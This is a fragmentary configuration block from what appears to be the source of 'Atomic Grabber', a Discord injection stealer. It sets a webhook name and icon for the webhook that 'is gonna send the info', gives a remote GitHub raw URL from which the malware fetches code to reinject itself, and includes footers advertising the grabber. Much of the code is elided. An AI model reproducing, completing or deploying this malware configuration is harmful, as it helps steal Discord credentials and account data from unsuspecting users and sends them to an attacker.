...
const config = {
  ...
  embed_name: 'Atomic Injection', //name of the webhook thats gonna send the info
  embed_icon: 'https://imgur.com/a/wnQf6Ln', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
  ...
  injection_url: 'https://raw.githubusercontent.com/yungvex/atomic-grabber-v2.1/main/Atomic-Injection.js', //injection url for when it reinjects
  /**
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・Discord Injection By Atomic Grabber!',
        },
      },
    ],
  };
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・Discord Injection By Atomic Grabbber!',
        },
      },
    ],
  };
